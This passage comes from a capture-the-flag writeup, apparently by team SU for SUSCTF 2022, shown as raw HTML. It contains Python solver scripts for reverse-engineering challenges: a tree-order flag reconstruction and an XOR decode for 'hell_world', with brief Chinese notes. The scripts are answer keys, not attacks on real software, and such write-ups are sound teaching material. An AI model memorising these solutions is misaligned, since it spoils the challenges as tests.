class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4d</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xfb</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x9e</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x91</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7d</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe9</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xd0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xfc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1f</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x45</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x62</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xa4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x92</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xac</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xfd</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x15</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xd4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb5</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xfc</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8b</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4a</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8e</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x2c</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xf5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x81</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xa8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x17</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x52</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xd0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xa8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xcc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x37</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xec</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> ]</span><br><span class="line">target = [ <span class="number">0xa2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xaf</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x9d</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb7</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xd2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xcb</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xc7</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xc6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xd5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xda</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xf3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xf4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xef</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xee</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xf7</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xf9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xf5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1f</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1a</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xdf</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> ]</span><br><span class="line">seed = u32(<span class="built_in">bytearray</span>([ <span class="number">0x20</span>, <span class="number">0x14</span>, <span class="number">0x2b</span>, <span class="number">0x01</span> ]))</span><br><span class="line"></span><br><span class="line">ic(<span class="built_in">hex</span>(seed))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rngesus</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">global</span> seed</span><br><span class="line">    seed = (seed * <span class="number">0xbc8f</span>) % <span class="number">0x7fffffff</span></span><br><span class="line">    <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line">buf = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lrbuf), <span class="number">8</span>):</span><br><span class="line">    cur = lrbuf[i:i+<span class="number">8</span>]</span><br><span class="line">    <span class="comment"># print(cur)</span></span><br><span class="line">    buf.append(u64(<span class="built_in">bytearray</span>(cur)))</span><br><span class="line"></span><br><span class="line">L=buf[:<span class="number">32</span>]</span><br><span class="line">R=buf[<span class="number">32</span>:]</span><br><span class="line">R[<span class="number">10</span>]=<span class="number">0</span> <span class="comment"># pain</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(L) == <span class="number">32</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(R) == <span class="number">32</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;L:&#x27;</span>, L)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>, R)</span><br><span class="line"></span><br><span class="line">no_two_child = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> L[i]%<span class="number">23</span> != R[i]%<span class="number">23</span>:</span><br><span class="line">        <span class="built_in">print</span>(i, L[i], R[i])</span><br><span class="line">        no_two_child.append(i)</span><br><span class="line"><span class="built_in">print</span>(no_two_child)</span><br><span class="line"></span><br><span class="line">t_v = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(target), <span class="number">4</span>):</span><br><span class="line">    cur = target[i:i+<span class="number">4</span>]</span><br><span class="line">    <span class="comment"># print(cur)</span></span><br><span class="line">    t_v.append(u32(<span class="built_in">bytearray</span>(cur)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;desired values:&#x27;</span>, t_v)</span><br><span class="line">pads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    pads.append(rngesus() % <span class="number">107</span> + <span class="number">97</span> + i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;number adds:&#x27;</span>, pads)</span><br><span class="line"></span><br><span class="line">priority = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    priority.append(rngesus())</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;priority:&#x27;</span>, priority)</span><br><span class="line"></span><br><span class="line">sp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    sp.append((priority[i], i))</span><br><span class="line">sp = <span class="built_in">sorted</span>(sp)</span><br><span class="line"><span class="built_in">print</span>(sp)</span><br><span class="line"><span class="comment"># since i=4 has smallest priority it&#x27;s the root</span></span><br><span class="line"><span class="comment"># pi: postorder index</span></span><br><span class="line">ans=<span class="built_in">bytearray</span>([<span class="number">0</span>]*<span class="number">32</span>)</span><br><span class="line">did=[]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">i: <span class="built_in">int</span>, pi: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">assert</span> i <span class="keyword">not</span> <span class="keyword">in</span> did</span><br><span class="line">    did.append(i)</span><br><span class="line">    cr = t_v[pi] - pads[i]</span><br><span class="line">    ans[i]=cr</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(i, pi, <span class="built_in">chr</span>(cr))</span><br><span class="line">    <span class="keyword">if</span> pi <span class="keyword">not</span> <span class="keyword">in</span> no_two_child:</span><br><span class="line">        <span class="keyword">assert</span> (L[pi] - cr) % <span class="number">23</span> == <span class="number">0</span></span><br><span class="line">        <span class="keyword">assert</span> (R[pi] - cr) % <span class="number">23</span> == <span class="number">0</span></span><br><span class="line">        li = (L[pi] - cr) // <span class="number">23</span></span><br><span class="line">        ri = (R[pi] - cr) // <span class="number">23</span></span><br><span class="line">        <span class="built_in">print</span>(li, ri)</span><br><span class="line">        np = pi</span><br><span class="line">        np = go(ri-<span class="number">1</span>, np-<span class="number">1</span>)</span><br><span class="line">        np = go(li-<span class="number">1</span>, np-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> np</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;bad case:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(R[pi], L[pi])</span><br><span class="line">        np = pi</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (R[pi] - cr) % <span class="number">23</span> == <span class="number">0</span>:</span><br><span class="line">            ri = (R[pi] - cr) // <span class="number">23</span></span><br><span class="line">            <span class="keyword">assert</span> ri&gt;<span class="number">0</span></span><br><span class="line">            <span class="built_in">print</span>(priority[i], priority[ri-<span class="number">1</span>])</span><br><span class="line">            np = go(ri-<span class="number">1</span>, np-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (L[pi] - cr) % <span class="number">23</span> == <span class="number">0</span>:</span><br><span class="line">            li = (L[pi] - cr) // <span class="number">23</span></span><br><span class="line">            <span class="keyword">assert</span> li&gt;<span class="number">0</span></span><br><span class="line">            <span class="built_in">print</span>(priority[i], priority[li-<span class="number">1</span>])</span><br><span class="line">            np = go(li-<span class="number">1</span>, np-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> np</span><br><span class="line"></span><br><span class="line">go(<span class="number">4</span>, <span class="number">31</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(did))</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>
<p>![img](.&#x2F; 1.jpg)</p>
<h2><span id="hell-world">hell_world</span><a href="#hell-world" class="header-anchor"></a></h2><p>跟西湖论剑题目gghdl差不多 就是改了下case结构和数据可以根据<a href="http://blog.bluesadi.cn/2021/11/24/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91gghdl%E9%A2%98%E8%A7%A3/">链接</a>来解题<br>从字符串搜索关键点<br><img src="./20220301005626448.jpg" alt="img"><br>之后就是慢慢解析每个case的作用<br>比如case7是一个循环的判断条件，case11是单字节比较分支。<br>之后慢慢调试一遍流程后 发现case11条件里面的sub_140009CC0函数与链接函数一样<br>所以进行调试发现 这个算法其实就是一个异或算法<br><img src="./20220301005626545.jpg" alt="img"><br><img src="./20220301005626508.jpg" alt="img"><br>上面的v74与v71是是输入的加密结果和密文，密文就在本分支的dword_1400F5B80[]数组<br>而且调试发现 其实加密之后的(2，3 其实表示的就是二进制的 0 ，1)<br>进而发现其实就是异或加密<br>异或的数据在case10分支的dword_1400F5C50数组当中</p>
<h3><span id="exp">exp</span><a href="#exp" class="header-anchor"></a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">data1 = [<span class="number">86</span>,</span><br><span class="line">  <span class="number">218</span>,</span><br><span class="line">  <span class="number">205</span>,</span><br><span class="line">  <span class="number">58</span>,</span><br><span class="line">  <span class="number">126</span>,</span><br><span class="line">  <span class="number">134</span>,</span><br><span class="line">  <span class="number">19</span>,</span><br><span class="line">  <span class="number">181</span>,</span><br><span class="line">  <span class="number">29</span>,</span><br><span class="line">  <span class="number">157</span>,</span><br><span class="line">  <span class="number">252</span>,</span><br><span class="line">  <span class="number">151</span>,</span><br><span class="line">  <span class="number">140</span>,</span><br><span class="line">  <span class="number">49</span>,</span><br><span class="line">  <span class="number">107</span>,</span><br><span class="line">  <span class="number">201</span>,</span><br><span class="line">  <span class="number">251</span>,</span><br><span class="line">  <span class="number">26</span>,</span><br><span class="line">  <span class="number">226</span>,</span><br><span class="line">  <span class="number">45</span>,</span><br><span class="line">  <span class="number">220</span>,</span><br><span class="line">  <span class="number">211</span>,</span><br><span class="line">  <span class="number">241</span>,</span><br><span class="line">  <span class="number">244</span>,</span><br><span class="line">  <span class="number">54</span>,</span><br><span class="line">  <span class="number">9</span>,</span><br><span class="line">  <span class="number">32</span>,</span><br><span class="line">  <span class="number">66</span>,</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  <span class="number">106</span>,</span><br><span class="line">  <span class="number">113</span>,</span><br><span class="line">  <span class="number">83</span>,</span><br><span class="line">  <span class="number">120</span>,</span><br><span class="line">  <span class="number">164</span>,</span><br><span class="line">  <span class="number">151</span>,</span><br><span class="line">  <span class="number">143</span>,</span><br><span class="line">  <span class="number">122</span>,</span><br><span class="line">  <span class="number">114</span>,</span><br><span class="line">  <span class="number">57</span>,</span><br><span class="line">  <span class="number">232</span>,</span><br><span class="line">  <span class="number">61</span>,</span><br><span class="line">  <span class="number">250</span>,</span><br><span class="line">  <span class="number">64</span>,</span><br><span class="line">  <span class="number">61</span>,</span><br><span class="line">  <span class="number">408</span>,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  <span class="number">0</span>]</span><br><span class="line">data2 = [<span class="number">5</span>,</span><br><span class="line">  <span class="number">143</span>,</span><br><span class="line">  <span class="number">158</span>,</span><br><span class="line">  <span class="number">121</span>,</span><br><span class="line">  <span class="number">42</span>,</span><br><span class="line">  <span class="number">192</span>,</span><br><span class="line">  <span class="number">104</span>,</span><br><span class="line">  <span class="number">129</span>,</span><br><span class="line">  <span class="number">45</span>,</span><br><span class="line">  <span class="number">252</span>,</span><br><span class="line">  <span class="number">207</span>,</span><br><span class="line">  <span class="number">164</span>,</span><br><span class="line">  <span class="number">181</span>,</span><br><span class="line">  <span class="number">85</span>,</span><br><span class="line">  <span class="number">95</span>,</span><br><span class="line">  <span class="number">228</span>,</span><br><span class="line">  <span class="number">157</span>,</span><br><span class="line">  <span class="number">35</span>,</span><br><span class="line">  <span class="number">214</span>,</span><br><span class="line">  <span class="number">29</span>,</span><br><span class="line">  <span class="number">241</span>,</span><br><span class="line">  <span class="number">231</span>,</span><br><span class="line">  <span class="number">151</span>,</span><br><span class="line">  <span class="number">145</span>,</span><br><span class="line">  <span class="number">6</span>,</span><br><span class="line">  <span class="number">36</span>,</span><br><span class="line">  <span class="number">66</span>,</span><br><span class="line">  <span class="number">113</span>,</span><br><span class="line">  <span class="number">60</span>,</span><br><span class="line">  <span class="number">88</span>,</span><br><span class="line">  <span class="number">92</span>,</span><br><span class="line">  <span class="number">48</span>,</span><br><span class="line">  <span class="number">25</span>,</span><br><span class="line">  <span class="number">198</span>,</span><br><span class="line">  <span class="number">245</span>,</span><br><span class="line">  <span class="number">188</span>,</span><br><span class="line">  <span class="number">75</span>,</span><br><span class="line">  <span class="number">66</span>,</span><br><span class="line">  <span class="number">93</span>,</span><br><span class="line">  <span class="number">218</span>,</span><br><span class="line">  <span class="number">88</span>,</span><br><span class="line">  <span class="number">155</span>,</span><br><span class="line">  <span class="number">36</span>,</span><br><span class="line">  <span class="number">64</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data2)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(data1[i] ^ data2[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><div class="article-licensing box"><div class="licensing-title"><p>2022 SUSCTF SU Writeup</p><p><a href="https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/">https://team-su.github.io/2022/03/01/2022-2-28-SUSCTF/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-03-01</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-06-03</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/SUSCTF/">SUSCTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/07/04/2022-ACTF-SU-Writeup/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2022 ACTF SU Writeup</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/01/30/2022-1-22-RWCTF/"><span class="level-item">2022 RWCTF体验赛 SU Writeup</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 